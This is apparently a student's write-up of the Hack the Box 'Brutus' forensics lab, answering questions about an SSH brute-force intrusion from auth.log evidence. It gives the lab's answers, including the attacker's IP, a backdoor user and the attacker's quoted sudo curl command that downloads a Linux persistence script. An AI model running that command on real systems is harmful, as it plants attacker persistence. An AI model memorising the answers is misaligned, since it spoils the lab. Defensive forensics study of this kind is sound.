# Brute Force Analysis 

## Objective

Brutus lab from Hack the Box 

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

### Skills Learned

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- Security Information and Event Management (SIEM) system for log ingestion and analysis.
- Network analysis tools (such as Wireshark) for capturing and examining network traffic.
- Telemetry generation tools to create realistic network traffic and attack scenarios.

## Steps
### Questions
Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

65.2.161.68

The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

Root

Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

2024-03-06 06:32:45

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

37


The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Cyberjunkie

What is the MITRE ATT&CK sub-technique ID used for persistence?

T1136.001

How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
279

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
